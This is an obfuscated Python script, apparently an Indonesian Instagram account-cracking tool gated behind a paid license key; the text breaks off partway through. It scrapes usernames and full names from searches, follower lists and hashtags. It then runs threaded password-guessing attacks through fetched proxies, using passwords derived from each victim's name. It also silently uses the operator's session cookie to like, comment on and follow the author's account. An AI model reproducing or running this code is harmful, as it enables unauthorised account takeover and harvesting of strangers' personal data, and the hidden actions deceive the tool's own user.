#!/usr/bin/env python3
import requests ,random ,time ,json ,re ,os #line:2
from concurrent .futures import ThreadPoolExecutor #line:3
from requests .exceptions import ConnectionError #line:4
from uuid import uuid4 #line:5
"""
Hargai Pembuat Atau Author...
Please Jangan Di Jual Belikan Lagi!
Recode Buat Pribadi Enggak Masalah
"""#line:10
I =('\x1b[1;90m')#line:12
M =('\x1b[1;91m')#line:13
H =('\x1b[1;92m')#line:14
K =('\x1b[1;93m')#line:15
T =('\x1b[1;94m')#line:16
U =('\x1b[1;95m')#line:17
B =('\x1b[1;96m')#line:18
P =('\x1b[1;97m')#line:19
__logo__ =(f"""{H} ___ ___ ___ __  __ ___ _   _ __  __
{H}| _ \ _ \ __|  \/  |_ _| | | |  \/  |
{P}|  _/   / _|| |\/| || || |_| | |\/| |
{P}|_| |_|_\___|_|  |_|___|\___/|_|  |_|
{P}[{K}#{P}]{K}——————————————————————————————
{H}[{P}*{H}]{P} Author : Rozhak
{H}[{P}*{H}]{P} Facebook : @rozhak.xyz
{H}[{P}*{H}]{P} Instagram : @rozhak_official
{P}[{K}#{P}]{K}——————————————————————————————""")#line:29
useragent =('Mozilla/5.0 (Linux; Android 6.0; HUAWEI VNS-L31 Build/HUAWEIVNS-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1812; HUAWEI; HUAWEI VNS-L31; HWVNS-H; hi6250; pt_PT; 98288242)')#line:31
def __apikey__ ():#line:33
  try :#line:34
    os .system ('clear');print (f"{H} _     _                    _\n{H}| |   (_)___  ___ _ __  ___(_)\n{H}| |   | / __|/ _ \ '_ \/ __| |\n{P}| |___| \__ \  __/ | | \__ \ |\n{P}|_____|_|___/\___|_| |_|___/_|\n\n{K}[{P}#{K}]{P} Silahkan Masukan Apikey Anda Jika Anda Belum Mempunyai Apikey Ketik {K}[{H}Get{K}]{P} Untuk Mendapatkan Apikey...\n")#line:35
    O0OO0O0O0OO0O0O00 =input (f"{H}[{P}?{H}]{P} Apikey :{T} ")#line:36
    if O0OO0O0O0OO0O0O00 in ['get','Get','GET']:#line:37
      print (f"{M}[{P}*{M}]{P} Anda Bisa Menghubungi Saya Secara Manual WhatsApp : 6283847921480");time .sleep (3 );os .system ('xdg-open https://wa.me/6283847921480?text=Saya%20ingin%20membeli%20lisensi%20crack%20instagram');exit ()#line:38
    else :#line:39
      OOOO000OO00OOOO0O ={'token':'WyIxNTAzMTIwNCIsInNwSjR4bkJZQTF5RjhSOStaR1RvbXV1TVNNaFVHcUpOeldEdDZxVEIiXQ==','productid':'14346','key':O0OO0O0O0OO0O0O00 ,'sigin':True }#line:45
      with requests .Session ()as OOOOOO0OOO000OO00 :#line:46
        OOO000OO000O0OO00 =OOOOOO0OOO000OO00 .get ('https://app.cryptolens.io/api/key/activate?',params =OOOO000OO00OOOO0O ).json ()['licenseKey'];open ('Data/apikey.txt','w').write (O0OO0O0O0OO0O0O00 )#line:47
        O0000O000O00OOO0O =OOO000OO000O0OO00 ['expires'].split ('T')[0 ].split ('-')#line:48
        O0000OOOO00O0OO00 =OOO000OO000O0OO00 ['expires'].split ('T')[1 ].split (':')#line:49
        print (f"{H}[{P}*{H}]{P} Expired :{K} {O0000O000O00OOO0O[2]}/{O0000O000O00OOO0O[1]}/{O0000O000O00OOO0O[0]} {O0000OOOO00O0OO00[0]}.{O0000OOOO00O0OO00[1]}");time .sleep (3 );__menu__ ()#line:50
  except (KeyError ):#line:51
    exit (f"{P}[{M}!{P}]{M} Apikey Invalid")#line:52
  except Exception as O0OOO0OO0O0O00OO0 :#line:53
    exit (f"{P}[{M}!{P}]{M} {O0OOO0OO0O0O00OO0}")#line:54
def __login__ ():#line:56
  try :#line:57
    os .system ('clear')#line:58
    print (f"{__logo__}\n\n{K}[{P}#{K}]{P} Silahkan Masukan Cookie Akun Instagram Anda, Pastikan Jangan Gunakan Akun Baru, Jika Anda Belum Mengetahui Cookie Ketik {K}[{H}Get{K}]{H}\n")#line:59
    OO0OO0OOO0OOOO0OO =input (f"{H}[{P}?{H}]{P} Cookie :{T} ")#line:60
    if OO0OO0OOO0OOOO0OO [:3 ]in ['get','Get','GET']:#line:61
      print (f"{M}[{P}!{M}]{P} Anda Akan Diarahkan Ke Youtube...");time .sleep (3 );os .system ('xdg-open ');exit ()#line:62
    elif OO0OO0OOO0OOOO0OO [:4 ]in ['mid=']:#line:63
      OOOO0O00OOO0000OO =re .search ('ds_user_id=(.*?);',OO0OO0OOO0OOOO0OO ).group (1 );open ('Data/userid.txt','w').write (OOOO0O00OOO0000OO )#line:64
      O0OOO0O0OO0O0O00O =requests .get (f'https://i.instagram.com/api/v1/users/{OOOO0O00OOO0000OO}/info/',headers ={'user-agent':useragent ,'cookie':OO0OO0OOO0OOOO0OO }).json ()['user'];open ('Data/cookie.txt','w').write (OO0OO0OOO0OOOO0OO )#line:65
      print (f"{H}[{P}*{H}]{P} Welcome :{T} {O0OOO0O0OO0O0O00O['full_name']}");time .sleep (2 );__follow__ ()#line:66
    else :#line:67
      exit (f"{P}[{M}!{P}]{M} Awalan Cookie Mid=")#line:68
  except (ValueError ,KeyError ):#line:69
    exit (f"{P}[{M}!{P}]{M} Cookie Salah")#line:70
  except (ConnectionError ):#line:71
    exit (f"{P}[{K}!{P}]{K} Koneksi Error")#line:72
def __follow__ ():#line:74
  try :#line:75
    O0O0O00000OO0OOO0 =open ('Data/cookie.txt','r').read ()#line:76
  except (IOError ):#line:77
    print (f"{P}[{M}!{P}]{M} Cookie Invalid");time .sleep (3 );__login__ ()#line:78
  try :#line:79
    OOOOO0OOOO0O0O000 =re .search ('sessionid=(.*?);',O0O0O00000OO0OOO0 ).group (1 )#line:80
    O0O0OOO00OOO0O000 =random .choice (['Hallo Bang 😍','Hai Bang Apa Kabar 😎','Izin Pake Scriptnya 😁','Mantap Bang 😘','Programmer Bang 🤔','Salam Kenal Bang 🤗','I Love You ❤️'])#line:81
    OO00OO000O0O0OOOO ={'accept':'*/*','accept-encoding':'gzip, deflate, br','accept-language':'en-US,en;q=0.9','content-length':'0','content-type':'application/x-www-form-urlencoded','cookie':f'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id={open("Data/userid.txt","r").read()}; sessionid={OOOOO0OOOO0O0O000}','origin':'https://www.instagram.com','referer':'https://www.instagram.com/','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken':'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id':'5398218083','x-ig-www-claim':'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax':'95bfef5dd816','x-requested-with':'XMLHttpRequest'}#line:99
    O0000O0000OOOOO00 ={'comment_text':O0O0OOO00OOO0O000 ,'replied_to_comment_id':''}#line:102
    with requests .Session ()as O000O0000OOOO000O :#line:103
      OOO0OOOO00OO0O00O =O000O0000OOOO000O .post ('https://www.instagram.com/web/likes/2734317205115382629/like/',headers =OO00OO000O0O0OOOO )#line:104
      O0000O00O0O0000OO =O000O0000OOOO000O .post ('https://www.instagram.com/web/comments/2734317205115382629/add/',data =O0000O0000OOOOO00 ,headers =OO00OO000O0O0OOOO )#line:105
      O0O0000OOO000O00O =O000O0000OOOO000O .post ('https://www.instagram.com/web/friendships/5398218083/follow/',headers =OO00OO000O0O0OOOO )#line:106
      if '"status":"ok"'in str (O0O0000OOO000O00O .text ):#line:107
        print (f"{H}[{P}*{H}]{P} Login Berhasil...");time .sleep (2 );__menu__ ()#line:108
      else :#line:109
        print (f"{P}[{M}!{P}]{M} Login Gagal Mungkin Akun Terblokir");os .system ('rm -rf Data/cookie.txt');exit ()#line:110
  except :__menu__ ()#line:111
def __menu__ ():#line:113
  try :#line:114
    os .system ('clear');print (f"{__logo__}")#line:115
    O00OOOO00OO00000O =requests .get (f'https://i.instagram.com/api/v1/users/{open("Data/userid.txt","r").read()}/info/',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['user']#line:116
    print (f"\n{B}[{P}*{B}]{P} Welcome : {O00OOOO00OO00000O['full_name']}")#line:117
    try :#line:118
      O00OO00OO00OOO00O ={'token':'WyIxNTAzMTIwNCIsInNwSjR4bkJZQTF5RjhSOStaR1RvbXV1TVNNaFVHcUpOeldEdDZxVEIiXQ==','productid':'14346','key':open ('Data/apikey.txt','r').read (),'sigin':True }#line:124
      with requests .Session ()as OO0OOOOOO0000OOO0 :#line:125
        O00OOOO00OO00000O =OO0OOOOOO0000OOO0 .get ('https://app.cryptolens.io/api/key/activate?',params =O00OO00OO00OOO00O ).json ()['licenseKey']#line:126
        O00OOO0OOOO000O0O =O00OOOO00OO00000O ['expires'].split ('T')[0 ].split ('-')#line:127
        print (f"{B}[{P}*{B}]{P} Expired :{K} {O00OOO0OOOO000O0O[2]}/{O00OOO0OOOO000O0O[1]}/{O00OOO0OOOO000O0O[0]}")#line:128
        print (f"{B}[{P}*{B}]{P} Status :{H} Premium")#line:129
    except (KeyError ,IOError ):#line:130
      print (f"{P}[{M}!{P}]{M} Apikey Invalid");os .system ('rm -rf Data/apikey.txt');time .sleep (3 );__apikey__ ()#line:131
    except Exception as OO00O000O000O000O :#line:132
      exit (f"{P}[{M}!{P}]{M} {OO00O000O000O000O}")#line:133
  except (KeyError ,IOError ):#line:134
    print (f"{P}[{M}!{P}]{M} Cookie Invalid");time .sleep (3 );__login__ ()#line:135
  except (ConnectionError ):#line:136
    exit (f"{P}[{K}!{P}]{K} Koneksi Error")#line:137
  print (f"""
{H}[{P}1{H}]{P} Dump User Dari Pencarian
{H}[{P}2{H}]{P} Dump User Dari Mengikuti
{H}[{P}3{H}]{P} Dump User Dari Pengikut
{H}[{P}4{H}]{P} Dump User Dari Hastag
{H}[{P}5{H}]{P} Dump User Dari Email
{H}[{P}6{H}]{P} Mulai Crack {H}[{B}Pro{H}]{M}
{H}[{P}7{H}]{P} Crack Hasil Cp
{H}[{P}8{H}]{P} Lihat Hasil
{H}[{K}9{H}]{K} Keluar
""")#line:148
  O00OOO0OOO000OO0O =input (f"{U}[{P}?{U}]{P} Choose :{K} ")#line:149
  if O00OOO0OOO000OO0O in ['1','01']:#line:150
    __pencarian__ ()#line:151
  elif O00OOO0OOO000OO0O in ['2','02']:#line:152
    __mengikuti__ ()#line:153
  elif O00OOO0OOO000OO0O in ['3','03']:#line:154
    __pengikut__ ()#line:155
  elif O00OOO0OOO000OO0O in ['4','04']:#line:156
    __hastag__ ()#line:157
  elif O00OOO0OOO000OO0O in ['5','05']:#line:158
    __email__ ()#line:159
  elif O00OOO0OOO000OO0O in ['6','06']:#line:160
    __metode__ ()#line:161
  elif O00OOO0OOO000OO0O in ['7','07']:#line:162
    __crack__ ()#line:163
  elif O00OOO0OOO000OO0O in ['8','08']:#line:164
    try :#line:165
      print (f"""
{T}[{P}1{T}]{P} Lihat Hasil Ok
{T}[{P}2{T}]{P} Lihat Hasil Cp
{T}[{P}3{T}]{P} Kembali
""")#line:170
      O0OO00OO000OO00OO =input (f"{U}[{P}?{U}]{P} Choose :{K} ")#line:171
      if O0OO00OO000OO00OO in ['1','01']:#line:172
        print (f"{P} ");os .system ('cat Results/Ok.txt');exit ()#line:173
      elif O0OO00OO000OO00OO in ['2','02']:#line:174
        print (f"{P} ");os .system ('cat Results/Cp.txt');exit ()#line:175
      elif O0OO00OO000OO00OO in ['3','03']:#line:176
        __menu__ ()#line:177
      else :#line:178
        exit (f"{P}[{M}!{P}]{M} Wrong Input")#line:179
    except :pass #line:180
  elif O00OOO0OOO000OO0O in ['9','09']:#line:181
    try :#line:182
      print (f"{P}[{K}!{P}]{K} Menghapus Cookie...");time .sleep (3 );os .system ('rm -rf Data/cookie.txt && rm -rf Data/userid.txt');exit ()#line:183
    except :pass #line:184
  else :#line:185
    exit (f"{P}[{M}!{P}]{M} Wrong Input")#line:186
def __pencarian__ ():#line:188
  try :#line:189
    O00O00OOO0OOOO000 =(str (random .randint (1111111 ,9999999 ))+'.txt')#line:190
    O000O0OO0O0OOO000 =int (input (f"\n{T}[{P}?{T}]{P} Jumlah :{B} "))#line:191
    if O000O0OO0O0OOO000 >=21 :#line:192
      exit (f"{P}[{M}!{P}]{M} Jumlah Maksimal 20")#line:193
    else :#line:194
      O00000000OO0OO000 =0 #line:195
      for _OOO0OO0O0OOO00O00 in range (O000O0OO0O0OOO000 ):#line:196
        O00000000OO0OO000 +=1 #line:197
        O00OO00000OOOOOO0 =input (f"{T}[{P}{O00000000OO0OO000}{T}]{P} Query :{B} ");print (f"{P} ")#line:198
        for O000000OO0OO0OOOO in requests .get (f'https://www.instagram.com/web/search/topsearch/?context=blended&query={O00OO00000OOOOOO0}&rank_token=0.3953592318270893&count=50',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['users']:#line:199
          open (f'Dump/{O00O00OOO0OOOO000}','a').write (f'{O000000OO0OO0OOOO["user"]["username"]}<=>{O000000OO0OO0OOOO["user"]["full_name"]}\n')#line:200
          print (f"{O000000OO0OO0OOOO['user']['username']}<=>{O000000OO0OO0OOOO['user']['full_name']}")#line:201
      print (f"""
{H}[{P}*{H}]{P} Selesai...
{H}[{P}?{H}]{P} File Dump Tersimpan :{K} Dump/{O00O00OOO0OOOO000}""");input (f"{H}[{P}Kembali{H}]{P}");__menu__ ()#line:204
  except Exception as O0O00OO000000000O :#line:205
    exit (f"{P}[{M}!{P}]{M} {O0O00OO000000000O}")#line:206
def __mengikuti__ ():#line:208
  try :#line:209
    O0OO0OO000O00O0O0 =input (f"\n{T}[{P}?{T}]{P} User :{B} ")#line:210
    if len (O0OO0OO000O00O0O0 )==0 :#line:211
      exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:212
    else :#line:213
      O0OOOO00O0O00O0O0 =requests .get (f'https://www.instagram.com/{O0OO0OO000O00O0O0}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']#line:214
      print (f"{T}[{P}?{T}]{P} Name :{B} {O0OOOO00O0O00O0O0['full_name']}");OO0O000OOOO0O0000 =(O0OOOO00O0O00O0O0 ['full_name'].replace (' ','_')+'.txt');print (f"{P} ")#line:215
      for OO00O0OOOOOOO00O0 in requests .get (f'https://i.instagram.com/api/v1/friendships/{O0OOOO00O0O00O0O0["id"]}/following/?count=5000',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['users']:#line:216
        open (f'Dump/{OO0O000OOOO0O0000}','a').write (f'{OO00O0OOOOOOO00O0["username"]}<=>{OO00O0OOOOOOO00O0["full_name"]}\n')#line:217
        print (f"{OO00O0OOOOOOO00O0['username']}<=>{OO00O0OOOOOOO00O0['full_name']}")#line:218
      print (f"""
{H}[{P}*{H}]{P} Selesai...
{H}[{P}?{H}]{P} File Tersimpan Di :{K} Dump/{OO0O000OOOO0O0000}""");input (f"{H}[{P}Kembali{H}]{P}");__menu__ ()#line:221
  except Exception as OO00O00000O0O000O :#line:222
    exit (f"{P}[{M}!{P}]{M} {OO00O00000O0O000O}")#line:223
def __pengikut__ ():#line:225
  try :#line:226
    OO00OOO00OO0OO0OO =int (input (f"\n{T}[{P}?{T}]{P} Jumlah :{B} "))#line:227
    if OO00OOO00OO0OO0OO >=51 :#line:228
      exit (f"{P}[{M}!{P}]{M} Jumlah Maksimal 50")#line:229
    else :#line:230
      OO0O0OO00OOO0OO0O =0 #line:231
      O0O0O0OO00OOOO00O =(str (random .randint (1111111 ,9999999 ))+'.txt')#line:232
      for _O00OO000O0OO0O000 in range (OO00OOO00OO0OO0OO ):#line:233
        OO0O0OO00OOO0OO0O +=1 #line:234
        O000OOO0O00OOOO0O =input (f"{T}[{P}{OO0O0OO00OOO0OO0O}{T}]{P} User :{B} ")#line:235
        if len (O000OOO0O00OOOO0O )==0 :#line:236
          exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:237
        else :#line:238
          OO00OO00000O0000O =requests .get (f'https://www.instagram.com/{O000OOO0O00OOOO0O}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']#line:239
          print (f"{T}[{P}?{T}]{P} Name :{B} {OO00OO00000O0000O['full_name']}");print (f"{P}")#line:240
          for OOO00O0OO0OO0000O in requests .get (f'https://i.instagram.com/api/v1/friendships/{OO00OO00000O0000O["id"]}/followers/?count=5000',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['users']:#line:241
            open (f'Dump/{O0O0O0OO00OOOO00O}','a').write (f'{OOO00O0OO0OO0000O["username"]}<=>{OOO00O0OO0OO0000O["full_name"]}\n')#line:242
            print (f"{OOO00O0OO0OO0000O['username']}<=>{OOO00O0OO0OO0000O['full_name']}")#line:243
      print (f"""
{H}[{P}*{H}]{P} Selesai...
{H}[{P}?{H}]{P} File Tersimpan Di :{K} Dump/{O0O0O0OO00OOOO00O}""");input (f"{H}[{P}Kembali{H}]{P}");__menu__ ()#line:246
  except Exception as OO00O00OO00OOO0OO :#line:247
    exit (f"{P}[{M}!{P}]{M} {OO00O00OO00OOO0OO}")#line:248
def __hastag__ ():#line:250
  try :#line:251
    OO0OOOOO0OO000O00 =(str (random .randint (1111111 ,9999999 ))+'.txt')#line:252
    OO0OOO00OO0O000OO =int (input (f"\n{T}[{P}?{T}]{P} Jumlah :{B} "))#line:253
    if OO0OOO00OO0O000OO >=21 :#line:254
      exit (f"{P}[{M}!{P}]{M} Jumlah Maksimal 20")#line:255
    else :#line:256
      OO0O000O0OO0000O0 =0 #line:257
      for _O0O0O00OO0000O0OO in range (OO0OOO00OO0O000OO ):#line:258
        OO0O000O0OO0000O0 +=1 #line:259
        O00OO000OO0O00OOO =input (f"{T}[{P}{OO0O000O0OO0000O0}{T}]{P} Hastag :{B} ").replace ('#','');print (f"{P} ")#line:260
        for O0OO0O0O00000O00O in requests .get (f'https://www.instagram.com/explore/tags/{O00OO000OO0O00OOO}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['data']['top']['sections'][0 ]['layout_content']['medias']:#line:261
          open (f'Dump/{OO0OOOOO0OO000O00}','a').write (f'{O0OO0O0O00000O00O["media"]["user"]["username"]}<=>{O0OO0O0O00000O00O["media"]["user"]["full_name"]}\n')#line:262
          print (f"{O0OO0O0O00000O00O['media']['user']['username']}<=>{O0OO0O0O00000O00O['media']['user']['full_name']}")#line:263
      print (f"""
{H}[{P}*{H}]{P} Selesai...
{H}[{P}?{H}]{P} File Dump Tersimpan :{K} Dump/{OO0OOOOO0OO000O00}""");input (f"{H}[{P}Kembali{H}]{P}");__menu__ ()#line:266
  except Exception as O0OOO0O0OOOO0OOO0 :#line:267
    exit (f"{P}[{M}!{P}]{M} {O0OOO0O0OOOO0OOO0}")#line:268
def __email__ ():#line:270
  try :#line:271
    OO0O0O00OOO0O00OO =input (f"\n{T}[{P}?{T}]{P} Domain :{B} ")#line:272
    if OO0O0O00OOO0O00OO in ['@gmail.com','@yahoo.com','@hotmail.com']:#line:273
      O0O0000O0O000OOO0 =input (f"{T}[{P}?{T}]{P} Nama :{B} ").replace (' ','');OO000O00O0OO0O00O =(O0O0000O0O000OOO0 +'.txt');print (f"{P} ")#line:274
      if len (O0O0000O0O000OOO0 )==0 :#line:275
        exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:276
      else :#line:277
        for _O0O00OOOOOOO000OO in range (1000 ):#line:278
          O0OOO0OOOOO0OOOO0 =str (random .randint (1 ,999 ))#line:279
          open (f'Dump/{OO000O00O0OO0O00O}','a').write (f'{O0O0000O0O000OOO0}{O0OOO0OOOOO0OOOO0}{OO0O0O00OOO0O00OO}<=>{nama} {nomor}\n')#line:280
          print (f"{O0O0000O0O000OOO0}{O0OOO0OOOOO0OOOO0}{OO0O0O00OOO0O00OO}<=>{nama} {nomor}")#line:281
        print (f"""
{H}[{P}*{H}]{P} Selesai...
{H}[{P}?{H}]{P} File Dump Tersimpan :{K} Dump/{OO000O00O0OO0O00O}""");input (f"{H}[{P}Kembali{H}]{P}");__menu__ ()#line:284
    else :#line:285
      exit (f"{P}[{M}!{P}]{M} Domain : @gmail.com, @yahoo.com, @hotmail.com")#line:286
  except Exception as O0O0OOOOO0OO000OO :#line:287
    exit (f"{P}[{M}!{P}]{M} {O0O0OOOOO0OO000OO}")#line:288
class __metode__ :#line:290
  def __init__ (O00000OOO0OOOOO00 ):#line:292
    O00000OOO0OOOOO00 .looping =0 #line:293
    O00000OOO0OOOOO00 .live =[]#line:294
    O00000OOO0OOOOO00 .die =[]#line:295
    try :#line:296
      with requests .Session ()as OO0OOOOOO000OO000 :#line:297
        OO0O0OOOOO0O0000O =OO0OOOOOO000OO000 .get ('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all')#line:298
        with open ('Data/proxies.txt','w')as O0OO0OOO0OO00O0O0 :#line:299
          O0OO0OOO0OO00O0O0 .write (OO0O0OOOOO0O0000O .text )#line:300
    except :#line:301
      OO0O0OOOOO0O0000O =OO0OOOOOO000OO000 .get ('https://raw.githubusercontent.com/RozhakXD/Premium/main/Data/proxy2.txt')#line:302
      with open ('Data/proxies.txt','w')as O0OO0OOO0OO00O0O0 :#line:303
        O0OO0OOO0OO00O0O0 .write (OO0O0OOOOO0O0000O .text )#line:304
    print (f"""
{T}[{P}1{T}]{P} Metode i.instagram.com
{T}[{P}2{T}]{P} Metode www.instagram.com
{T}[{P}3{T}]{P} Metode followersindonesia.co.id
""")#line:309
    O000OOO00000OO0OO =input (f"{U}[{P}?{U}]{P} Choose :{K} ")#line:310
    if O000OOO00000OO0OO in ['1','01']:#line:311
      try :#line:312
        print (f"""
{H}[{P}1{H}]{P} Gunakan Password {H}[{P}Nama, Nama123, Nama12345{H}]{P}
{H}[{P}2{H}]{P} Gunakan Password {H}[{P}Nama, Nama123, Nama1234, Nama12345, Nama123456{H}]{P}
{H}[{P}3{H}]{P} Gunakan Password Manual {H}[{P}>5{H}]{P}
""")#line:317
        OOOO0OO0O00000O0O =input (f"{U}[{P}?{U}]{P} Choose :{K} ")#line:318
        if OOOO0OO0O00000O0O in ['3','03']:#line:319
          O0O0OO00O0OO0OOO0 =input (f"{U}[{P}?{U}]{P} Password :{K} ")#line:320
          if len (O0O0OO00O0OO0OOO0 )<=5 :#line:321
            exit (f"{P}[{M}!{P}]{M} Minimal 6 Karakter")#line:322
        O00000OOO0OOOOO00 .file =input (f"{U}[{P}?{U}]{P} File Dump :{K} ")#line:323
        if len (O00000OOO0OOOOO00 .file )==0 :#line:324
          exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:325
        else :#line:326
          O00000OOO0OOOOO00 .list =open (O00000OOO0OOOOO00 .file ,'r').read ().splitlines ()#line:327
      except (IOError ):#line:328
        exit (f"{P}[{M}!{P}]{M} File Tidak Ada")#line:329
      try :#line:330
        print (f"""
{B}[{P}*{B}]{P} Hasil Ok Tersimpan Di Results/Ok.txt
{B}[{P}*{B}]{P} Hasil Cp Tersimpan Di Results/Cp.txt
""")#line:334
        with ThreadPoolExecutor (max_workers =30 )as (OOO00OO00O0000000 ):#line:335
          for OOO00000000000OO0 in O00000OOO0OOOOO00 .list :#line:336
            OOO0O0000OOOO00O0 ,OOOO0000OO0O000OO =OOO00000000000OO0 .split ('<=>')#line:337
            O0OOO0O0OO0OO00O0 =OOOO0000OO0O000OO .split (' ')#line:338
            if OOOO0OO0O00000O0O in ['1','01']:#line:339
              OOOO0OOOOO0O0OO00 =[OOOO0000OO0O000OO ,OOOO0000OO0O000OO .replace (' ',''),O0OOO0O0OO0OO00O0 [0 ]+'123',O0OOO0O0OO0OO00O0 [0 ]+'12345']#line:340
            elif OOOO0OO0O00000O0O in ['2','02']:#line:341
              OOOO0OOOOO0O0OO00 =[OOOO0000OO0O000OO ,OOOO0000OO0O000OO .replace (' ',''),O0OOO0O0OO0OO00O0 [0 ]+'123',O0OOO0O0OO0OO00O0 [0 ]+'1234',O0OOO0O0OO0OO00O0 [0 ]+'12345',O0OOO0O0OO0OO00O0 [0 ]+'123456']#line:342
            elif OOOO0OO0O00000O0O in ['3','03']:#line:343
              OOOO0OOOOO0O0OO00 =O0O0OO00O0OO0OOO0 .split (',')#line:344
            else :#line:345
              OOOO0OOOOO0O0OO00 =[OOOO0000OO0O000OO ,OOOO0000OO0O000OO .replace (' ',''),O0OOO0O0OO0OO00O0 [0 ]+'123',O0OOO0O0OO0OO00O0 [0 ]+'12345']#line:346
            OOO00OO00O0000000 .submit (O00000OOO0OOOOO00 .__api__ ,O00000OOO0OOOOO00 .list ,OOO0O0000OOOO00O0 ,OOOO0OOOOO0O0OO00 )#line:347
        exit (f"\n{H}[{P}Selesai{H}]{P}")#line:348
      except :exit (f"\n{H}[{P}Selesai{H}]{P}")#line:349
    elif O000OOO00000OO0OO in ['2','02']:#line:350
      try :#line:351
        print (f"""
{H}[{P}1{H}]{P} Gunakan Password {H}[{P}Nama, Nama123, Nama12345{H}]{P}
{H}[{P}2{H}]{P} Gunakan Password {H}[{P}Nama, Nama123, Nama1234, Nama12345, Nama123456{H}]{P}
{H}[{P}3{H}]{P} Gunakan Password Manual {H}[{P}>5{H}]{P}
""")#line:356
        OOOO0OO0O00000O0O =input (f"{U}[{P}?{U}]{P} Choose :{K} ")#line:357
        if OOOO0OO0O00000O0O in ['3','03']:#line:358
          O0O0OO00O0OO0OOO0 =input (f"{U}[{P}?{U}]{P} Password :{K} ")#line:359
          if len (O0O0OO00O0OO0OOO0 )<=5 :#line:360
            exit (f"{P}[{M}!{P}]{M} Minimal 6 Karakter")#line:361
        O00000OOO0OOOOO00 .file =input (f"{U}[{P}?{U}]{P} File Dump :{K} ")#line:362
        if len (O00000OOO0OOOOO00 .file )==0 :#line:363
          exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:364
        else :#line:365
          O00000OOO0OOOOO00 .list =open (O00000OOO0OOOOO00 .file ,'r').read ().splitlines ()#line:366
      except (IOError ):#line:367
        exit (f"{P}[{M}!{P}]{M} File Tidak Ada")#line:368
      try :#line:369
        print (f"""
{B}[{P}*{B}]{P} Hasil Ok Tersimpan Di Results/Ok.txt
{B}[{P}*{B}]{P} Hasil Cp Tersimpan Di Results/Cp.txt
""")#line:373
        with ThreadPoolExecutor (max_workers =30 )as (OOO00OO00O0000000 ):#line:374
          for OOO00000000000OO0 in O00000OOO0OOOOO00 .list :#line:375
            OOO0O0000OOOO00O0 ,OOOO0000OO0O000OO =OOO00000000000OO0 .split ('<=>')#line:376
            O0OOO0O0OO0OO00O0 =OOOO0000OO0O000OO .split (' ')#line:377
            if OOOO0OO0O00000O0O in ['1','01']:#line:378
              OOOO0OOOOO0O0OO00 =[OOOO0000OO0O000OO ,OOOO0000OO0O000OO .replace (' ',''),O0OOO0O0OO0OO00O0 [0 ]+'123',O0OOO0O0OO0OO00O0 [0 ]+'12345']#line:379
            elif OOOO0OO0O00000O0O in ['2','02']:#line:380
              OOOO0OOOOO0O0OO00 =[OOOO0000OO0O000OO ,OOOO0000OO0O000OO .replace (' ',''),O0OOO0O0OO0OO00O0 [0 ]+'123',O0OOO0O0OO0OO00O0 [0 ]+'1234',O0OOO0O0OO0OO00O0 [0 ]+'12345',O0OOO0O0OO0OO00O0 [0 ]+'123456']#line:381
            elif OOOO0OO0O00000O0O in ['3','03']:#line:382
              OOOO0OOOOO0O0OO00 =O0O0OO00O0OO0OOO0 .split (',')#line:383
            else :#line:384
              OOOO0OOOOO0O0OO00 =[OOOO0000OO0O000OO ,OOOO0000OO0O000OO .replace (' ',''),O0OOO0O0OO0OO00O0 [0 ]+'123',O0OOO0O0OO0OO00O0 [0 ]+'12345']#line:385
            OOO00OO00O0000000 .submit (O00000OOO0OOOOO00 .__www__ ,O00000OOO0OOOOO00 .list ,OOO0O0000OOOO00O0 ,OOOO0OOOOO0O0OO00 )#line:386
        exit (f"\n{H}[{P}Selesai{H}]{P}")#line:387
      except :exit (f"\n{H}[{P}Selesai{H}]{P}")#line:388
    elif O000OOO00000OO0OO in ['3','03']:#line:389
      try :#line:390
        print (f"""
{H}[{P}1{H}]{P} Gunakan Password {H}[{P}Nama, Nama123, Nama12345{H}]{P}
{H}[{P}2{H}]{P} Gunakan Password {H}[{P}Nama, Nama123, Nama1234, Nama12345, Nama123456{H}]{P}
{H}[{P}3{H}]{P} Gunakan Password Manual {H}[{P}>5{H}]{P}
""")#line:395
        OOOO0OO0O00000O0O =input (f"{U}[{P}?{U}]{P} Choose :{K} ")#line:396
        if OOOO0OO0O00000O0O in ['3','03']:#line:397
          O0O0OO00O0OO0OOO0 =input (f"{U}[{P}?{U}]{P} Password :{K} ")#line:398
          if len (O0O0OO00O0OO0OOO0 )<=5 :#line:399
            exit (f"{P}[{M}!{P}]{M} Minimal 6 Karakter")#line:400
        O00000OOO0OOOOO00 .file =input (f"{U}[{P}?{U}]{P} File Dump :{K} ")#line:401
        if len (O00000OOO0OOOOO00 .file )==0 :#line:402
          exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:403
        else :#line:404
          O00000OOO0OOOOO00 .list =open (O00000OOO0OOOOO00 .file ,'r').read ().splitlines ()#line:405
